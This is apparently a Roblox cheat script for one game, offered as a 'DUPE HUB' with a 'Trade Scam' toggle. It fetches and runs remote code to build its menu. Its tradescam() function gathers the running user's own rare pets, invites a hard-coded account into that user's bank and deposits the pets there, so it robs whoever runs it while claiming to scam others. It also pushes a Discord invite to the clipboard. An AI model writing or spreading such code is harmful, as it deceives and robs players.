if game.PlaceId == 6284583030 then
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "DUPE HUB", HidePremium = false, Intro = true, IntroText = "DUPE HUB LOADER", SaveConfig = false, ConfigFolder = "OrionTest"})

--Values
getgenv().copy = true
getgenv().tradescam = true

--Functions
function copy()
    setclipboard("https://discord.gg/7bbtSKQ9Aq")
    toclipboard("https://discord.gg/7bbtSKQ9Aq")
end

function tradescam()
        local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
        local mybanks = lib.Network.Invoke("get my banks")
        local PetsList = {}
        for i,v in pairs(lib.Save.Get().Pets) do
            local v2 = lib.Directory.Pets[v.id];
         if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.r then
               table.insert(PetsList, v.uid);
            end
        end
        if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], 3414452884) then
        end
        local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, - 0);
        if request then
        end;
    end

local Tab = Window:MakeTab({
	Name = "Home",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddParagraph("About Script","Script got leaked by DUPEHUB#3217 (Me)")

Tab:AddButton({
	Name = "Copy Discord Invite to Clipboard!",
	Callback = function(Value)
      		copy()
  	end    
})


local Tab = Window:MakeTab({
	Name = "Trade Scam",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddParagraph("This keep icon of pets in trade for other dude","Working with some pets with bug icons and huges")

Tab:AddSlider({
	Name = "Change this to 200 seconds!",
	Min = 0,
	Max = 2000,
	Default = 10,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "seconds",
	Callback = function(Value)
		print(Value)
	end    
})

Tab:AddToggle({
	Name = "Trade Scam",
	Default = false,
	Callback = function()
		getgenv().tradescam = Value
		tradescam()
	end    
})

end
OrionLib:Init()
